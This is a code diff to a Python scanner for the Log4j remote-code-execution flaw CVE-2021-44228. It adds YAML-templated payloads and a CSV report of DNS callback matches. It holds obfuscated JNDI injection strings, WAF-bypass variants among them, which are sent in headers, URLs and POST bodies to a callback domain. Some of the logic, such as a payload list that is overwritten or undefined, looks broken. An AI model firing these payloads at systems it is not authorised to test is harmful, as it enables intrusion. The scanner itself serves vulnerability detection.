@@ -8,7 +8,7 @@
 #
 # ******************************************************************
 
-this_version = "0.2 2021-12-13"
+this_version = "0.4 2021-12-22"
 
 import argparse
 import random
@@ -24,9 +24,14 @@ import os
 import hashlib 
 import socket
 import shutil
+import glob 
+
 from uuid import uuid4
 from base64 import b64encode
 from termcolor import cprint
+from jinja2 import Template
+
+
 
 # ~ from Crypto.Cipher import AES, PKCS1_OAEP
 # ~ from Crypto.PublicKey import RSA
@@ -58,7 +63,7 @@ default_headers = {
     'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
 }
 post_data_parameters = ["username", "user", "email", "email_address", "password"]
-timeout = 1.5
+timeout = 2
 waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                        "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
                        "${jndi:rmi://{{callback_host}}}",
@@ -131,6 +136,55 @@ def get_fuzzing_headers(payload):
     fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
     return fuzzing_headers
 
+def get_custom_payloads(app):
+  payloads_dir = "payloads"
+  payloads = {}
+  if app == "all":
+    payload_list = glob.glob("%s/*.yaml" % payloads_dir)
+  else:
+    payload_list = glob.glob("%s/%s.yaml" % (payloads_dir, app))
+  
+  for pl in payload_list:
+    with open(pl, "r") as py:
+      try:
+        payload_yaml = yaml.safe_load(py)
+      except yaml.YAMLError as exc:
+        print(exc)
+        sys.exit(2)
+    payload_name = pl.split("/")[-1].split(".")[0]
+    if "url" in payload_yaml:
+      payload_url = payload_yaml["url"]
+    else:
+      payload_url = "/"
+      
+    payload_headers = []
+    if "headers" in payload_yaml:
+      for header in payload_yaml["headers"]:
+        payload_headers.append(header)
+    
+    payloads[payload_name] = { "url": payload_url, "headers": payload_headers }
+    if "method" in payload_yaml:
+      payload_method = payload_yaml["method"]
+    else:
+      payload_method = "GET"
+
+    if "data" in payload_yaml:
+      payload_data = payload_yaml["data"]
+    else:
+      payload_data = ""
+
+
+    payloads[payload_name] = { 
+    
+        "url": payload_url, 
+        "headers": payload_headers, 
+        "method":  payload_method, 
+        "data": payload_data, 
+        
+      }
+  
+  return(payloads)
+    
 
 def get_fuzzing_post_data(payload):
     fuzzing_post_data = {}
@@ -172,7 +226,7 @@ def parse_url(url):
             "file_path": file_path})
 
 
-def scan_url(url):
+def scan_host(host_cx):
 
     record_out = "%s/global.log" % scan_output
     ts = int(time.time())
@@ -194,49 +248,87 @@ def scan_url(url):
           continue
           
 
-    parsed_url = parse_url(url)
-    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
-    #payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
-    host_id_raw = url + scan_id
-    host_id = "%s.%s" % (hashlib.sha224(host_id_raw.encode('utf-8')).hexdigest()[0:12], scan_id)
-    host_payload = "%s.%s" % (host_id, base_scan_domain)
-    #check if already checked
-    if host_id in recorded:
-      cprint(f"[i] already checked URL: {url} | PAYLOAD: {host_payload}", "yellow")
-      return() 
-    # ~ remote_pi = socket.gethostbyname(host_payload)
-    ts = int(time.time())
-    
-    
-    payloads = []
-    for proto in ["ldap", "rmi", "dns", "iiop"]:
-      # make this working in v0.5
-      payloadx = '${${env:BARFOX:-j}${env:BARFOX:-n}di${env:BARFOX:-:}ld${env:BARFOX:-a}p${env:BARFOX:-:}//%s/%s}' % (host_payload, random_string)
-    
-    payload = '${${env:BARFOX:-j}${env:BARFOX:-n}di${env:BARFOX:-:}ld${env:BARFOX:-a}p${env:BARFOX:-:}//%s/%s}' % (host_payload, random_string)
-    # ~ print(payload)
-    payloads = [payload]
 
-    # now record my call 
-    with open(record_out, "a") as r_a:
-      r_a.write("%s, %s, %s, %s, %s\n" % (ts, url, host_id, time.ctime(), payload ))
-      # ~ cprint(f"[*] scanURL: {url} | PAYLOAD: {host_payload}", "cyan")
 
     
 
+    payloads_from_definitions = get_custom_payloads(scan_mode)
     
-
     
     if waf_bypass:
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
-    for payload in payloads:
-        cprint(f"[*] URL: %-30s | PAYLOAD: %s" % (url, host_payload), "cyan")
-        try:
-          requests.get(url, headers=get_fuzzing_headers(payload), verify=False, timeout=timeout)
-        except Exception as e:
-          pass
-          # ~ cprint(f"EXCEPTION: {e}")
+    for payload in payloads_from_definitions:
+      pl_data = payloads_from_definitions[payload]
+      
 
+      # ~ pg("\n---[ %s ]--------\n" % payload)
+      # ~ pm(pl_data)
+      
+      
+      #parsed_url = parse_url(url)
+      random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
+      #payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
+      host_id_raw = host_cx + scan_id + payload
+      host_id = "%s.%s" % (hashlib.sha224(host_id_raw.encode('utf-8')).hexdigest()[0:12], scan_id)
+      host_payload = "%s.%s" % (host_id, base_scan_domain)
+      #check if already checked
+      if host_id in recorded:
+        cprint(f"[i] already checked URL: {host_cx} | PAYLOAD: {host_payload}", "yellow")
+        return() 
+      # ~ remote_pi = socket.gethostbyname(host_payload)
+      ts = int(time.time())
+      
+      #
+      # https://twitter.com/marcioalm/status/1471740771581652995
+      jndi_payload = '${${env:BARFUX:-j}${env:BARFIX:-n}di${env:BARFAX:-:}ld${env:BARFEX:-a}p${env:BARFYX:-:}//127.0.0.1#%s/%s}' % (host_payload, random_string)
+
+
+      # generating now payload herader/url - payload based on template
+      if payload in ("solr", "global-protect"):
+        pl_url = "%s%s" % (host_cx, Template(pl_data["url"]).render(PAYLOAD = host_payload))
+      else:
+        pl_url = "%s%s" % (host_cx, Template(pl_data["url"]).render(PAYLOAD = jndi_payload))
+      
+      pl_headers = {}
+      
+      for h in pl_data["headers"]:
+        h_v = h.split(":")[0].strip()
+        h_k = Template(h.split(":")[1].strip()).render(PAYLOAD = jndi_payload)
+        pl_headers[h_v] = h_k
+      
+      payloads = []
+      for proto in ["ldap", "rmi", "dns", "iiop"]:
+        # make this working in v0.5
+        jndi_payload = '${${env:BARFOX:-j}${env:BARFOX:-n}di${env:BARFOX:-:}ld${env:BARFOX:-a}p${env:BARFOX:-:}//127.0.0.1#%s/%s}' % (host_payload, random_string)
+        payloads.append(jndi_payload)
+      # ~ print(payload)
+      # ~ payloads = [payload]
+  
+      # now record my call 
+      with open(record_out, "a") as r_a:
+        r_a.write("%s, %s, %s, %s, %s\n" % (ts, host_cx, host_id, time.ctime(), payload ))
+        # ~ cprint(f"[*] scanURL: {url} | PAYLOAD: {host_payload}", "cyan")
+        
+        cprint(f"[*] URL: %-30s | %-16s | PAYLOAD: %s" % (host_cx, payload, host_payload), "cyan")
+        # ~ pg(pl_url)
+        # ~ pg(pl_headers)
+        if pl_data["method"]  == "GET":
+          try:
+            status = requests.get(pl_url, headers=pl_headers, verify=False, timeout=timeout)
+            pg(status.status_code)
+          except Exception as e:
+            pass
+            cprint(f"EXCEPTION: {e}")
+        elif pl_data["method"]  == "POST":
+          data = Template(pl_data["data"]).render(PAYLOAD = host_payload)
+
+          try:
+            status = requests.post(pl_url, headers=pl_headers, data = data, verify=False, timeout=timeout)
+            pg(status.status_code)
+          except:
+            pr("error in POSTing to %s" % pl_url)
+            pass
+            
 
 
 def main_scan():
@@ -250,8 +342,8 @@ def main_scan():
 
 
     cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
-    for url in urls:
-        scan_url(url)
+    for host in urls:
+      scan_host(host)
 
     cprint("[*] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "cyan")
     cprint("[*] go grab a coffe and check results with", "cyan")
@@ -261,6 +353,8 @@ def main_scan():
 def main_report():
 
     record_out = "%s/global.log" % scan_output
+    matched_csv = "%s/%s-matched.csv" % (scan_output, scan_name)
+    
     ts = int(time.time())
     if not os.path.isfile(record_out):
       with open(record_out, "a") as r_o:
@@ -276,7 +370,7 @@ def main_report():
         if line.startswith("#"):
           continue
         rts, host, host_id, date, payload = line.split(",")
-        recorded_dict[host_id.strip()] = { "ts": rts.strip(), "host": host.strip(), "date": date.strip() }
+        recorded_dict[host_id.strip()] = { "ts": rts.strip(), "host": host.strip(), "date": date.strip(), "payload": payload}
 
     #reading in the bind.log
     bind_dict = {}
@@ -285,22 +379,29 @@ def main_report():
         line = line.strip()
         linex = line.split(" ")
         lineq = line.split("query:")[1].split("IN")[0].strip()
-        date = "%s %s" % (linex[0], linex[1])
+        date = "%s %s" % (linex[0], linex[1].split(".")[0])
         host_ip = linex[4].split("#")[0].strip()
         host_id = lineq.split(".%s" % base_scan_domain)[0]
         bind_dict[host_id] = { "host": host_ip, "date": date }
     
     # comparing
     
-    print(bind_dict)
+    # ~ print(bind_dict)
     
-    for hid in recorded_dict:
-      # ~ print(hid)
+    with open(matched_csv, "w") as mo:
+      mo.write("ScanDate, CallbackDate, ScannedHost, CallbackHost, ScanType, Designator \n")
       
-      if hid in bind_dict:
-        cprint("[!] MATCH %s | %s | %s" % (bind_dict[hid]["host"], recorded_dict[hid]["host"], bind_dict[hid]["date"] ), "red")
-      else:
-        cprint("[+] OK    %s " % (recorded_dict[hid]["host"] ), "green")
+    
+      for hid in recorded_dict:
+        # ~ print(hid)
+        for bid in bind_dict:
+          if bid.find(hid) > -1:
+            cprint("[!] MATCH %s | %s | %s" % (bind_dict[bid]["host"], recorded_dict[hid]["host"], bind_dict[bid]["date"] ), "red")
+            mo.write("%s, %s, %s, %s, %s, %s \n" % (time.strftime("%d-%b-%Y %H:%M", time.localtime(float(recorded_dict[hid]["ts"]))),  bind_dict[bid]["date"] , recorded_dict[hid]["host"].split("://")[1].split(":")[0], bind_dict[bid]["host"], recorded_dict[hid]["payload"], hid))
+            
+          else:
+            continue
+            #cprint("[+] OK    %s " % (recorded_dict[hid]["host"] ), "green")
     
     
     
